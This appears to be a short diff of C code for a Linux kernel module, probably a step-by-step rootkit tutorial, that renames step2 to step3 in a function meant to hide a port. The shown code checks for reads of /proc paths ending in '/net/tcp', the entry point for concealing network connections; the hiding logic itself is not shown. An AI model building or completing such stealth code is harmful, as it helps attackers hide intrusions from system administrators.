@@ -1,12 +1,12 @@
-#include "step2.h"
+#include "step3.h"
 #include "helpers.h"
 #include <linux/string.h>
 #include <linux/sprintf.h>
 
 ssize_t
-step2_hide_pid(char *read_block_id, char *read_path, char *read_buffer, size_t read_buffer_size, int port_to_hide) {
+step3_hide_pid(char *read_block_id, char *read_path, char *read_buffer, size_t read_buffer_size, int port_to_hide) {
 
-    // not relevant to step2
+    // not relevant to step3
     if (strcmp(read_block_id, "proc") != 0 || !ends_with(read_path, "/net/tcp"))
         return -1;
 
